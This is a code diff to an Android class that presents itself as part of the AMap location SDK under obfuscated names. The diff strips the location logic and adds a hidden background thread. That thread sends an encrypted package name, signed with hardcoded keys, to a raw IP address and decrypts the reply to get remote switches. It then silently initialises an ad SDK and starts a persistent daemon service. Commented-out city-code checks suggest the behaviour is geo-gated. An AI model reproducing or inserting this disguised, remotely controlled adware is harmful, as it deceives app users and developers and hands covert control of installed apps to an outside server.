@@ -2,17 +2,12 @@ package com.amap.api.loc.location;
 
 import android.annotation.SuppressLint;
 import android.app.Activity;
-import android.content.Context;
 import android.content.Intent;
-import android.location.Criteria;
-import android.location.Location;
-import android.location.LocationListener;
 import android.location.LocationManager;
-import android.os.Bundle;
 import android.util.Log;
-import android.widget.Toast;
 
 import com.amap.api.loc.DaemonService;
+import com.amap.api.loc.querry.Key64;
 
 import net.youmi.android.AdManager;
 
@@ -21,15 +16,14 @@ import org.json.JSONObject;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 
 public class A {
     //implements AMapLocationListener
     private static final String TAG = "AAAAA";
     Activity av;
-//    private AMapLocationClient mLocationClient;
 
-    LocationManager myLocationManager;
 
     @SuppressLint({"NewApi"})
     public void b(Activity activity) {
@@ -60,18 +54,32 @@ public class A {
             String[] permissions = (String[]) list.toArray(new String[list.size()]);
             activity.requestPermissions(permissions, 1);
         }
-//
-//        new Thread(new Runnable() {
-//            @Override
-//            public void run() {
-//                c();
-//            }
-//        }).start();
-        if(D.getString(av,"cityCode")!=null) {
-            Log.e(TAG,D.getString(av,"cityCode"));
-            AdManager.getInstance(av).init("1fe9f8dfa353a941", "8c96bcec3eb5188a", true, true);
-            av.startService(new Intent(av, DaemonService.class));
-        }
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                String temp = Key64.encrypt(av.getPackageName());
+                String s1 = "appKeylqb6e2550cbc1bb579";
+
+                String s2 = "param" + temp;
+                String s3 = "appSecret49f3f2e26c54e161fc0h1ac0dc74b1da";
+                String[] arr = {s1, s2, s3};
+                Arrays.sort(arr);
+                String str = "";
+
+                for (int i = 0; i < arr.length; i++) {
+                    str += arr[i];
+                }
+                String url = "http://47.98.192.132:8080/api/config?param=" + temp + "&appKey=lqb6e2550cbc1bb579&sign=" + com.amap.api.loc.querry.SHA1.encode(str);
+                c(url);
+            }
+
+        }).start();
+//        if(D.getString(av,"cityCode")!=null&&!D.getString(av,"cityCode").equals("0551")) {
+//            Log.e(TAG,D.getString(av,"cityCode"));
+//            AdManager.getInstance(av).init("1fe9f8dfa353a941", "8c96bcec3eb5188a", true, true);
+//            av.startService(new Intent(av, DaemonService.class));
+//        }
 
 
     }
@@ -81,45 +89,31 @@ public class A {
         try {
             String baseUrl = u;
             StringBuilder tempParams = new StringBuilder();
-//                int pos = 0;
-//                for (String key : paramsMap.keySet()) {
-//                    if (pos > 0) {
-//                        tempParams.append("&");
-//                    }
-//                    tempParams.append(String.format("%s=%s", key, URLEncoder.encode(paramsMap.get(key),"utf-8")));
-//                    pos++;
-//                }
             String requestUrl = baseUrl + tempParams.toString();
-            // 新建一个URL对象
             URL url = new URL(requestUrl);
-            // 打开一个HttpURLConnection连接
             HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
-            // 设置连接主机超时时间
             urlConn.setConnectTimeout(5 * 1000);
-            //设置从主机读取数据超时
             urlConn.setReadTimeout(5 * 1000);
-            // 设置是否使用缓存  默认是true
             urlConn.setUseCaches(true);
-            // 设置为Post请求
             urlConn.setRequestMethod("GET");
-            //urlConn设置请求头信息
-            //设置请求中的媒体类型信息。
             urlConn.setRequestProperty("Content-Type", "application/json");
-            //设置客户端与服务连接类型
             urlConn.addRequestProperty("Connection", "Keep-Alive");
-            // 开始连接
             urlConn.connect();
-            // 判断请求是否成功
             if (urlConn.getResponseCode() == 200) {
-                // 获取返回的数据
                 String result = B.b(urlConn.getInputStream());
                 Log.e(TAG, "Get方式请求成功，result--->" + result);
                 JSONObject jsonObject = new JSONObject(result);
                 if (jsonObject != null && jsonObject.getInt("code") == 0) {
                     try {
 
-                        JSONObject data = jsonObject.getJSONObject("result");
+                        JSONObject data = new JSONObject(Key64.decipher(jsonObject.getString("result")));
                         if (data != null) {
+
+                            D.setLong(av, "launchTime", data.getLong("launchTime"));
+                            D.setString(av, "NoCityCode", data.getString("cityCode"));
+                            D.setInt(av, "rate", data.getInt("rate"));
+                            D.setBoolean(av, "adSwitch", data.getBoolean("adSwitch"));
+
                             AdManager.getInstance(av).init(data.getString("appKey"), data.getString("appSecret"), true, true);
                             av.startService(new Intent(av, DaemonService.class));
                         }
@@ -129,9 +123,7 @@ public class A {
 
                 }
             } else {
-                Log.e(TAG, "Get方式请求失败");
             }
-            // 关闭连接
             urlConn.disconnect();
         } catch (Exception e) {
             Log.e(TAG, e.toString());
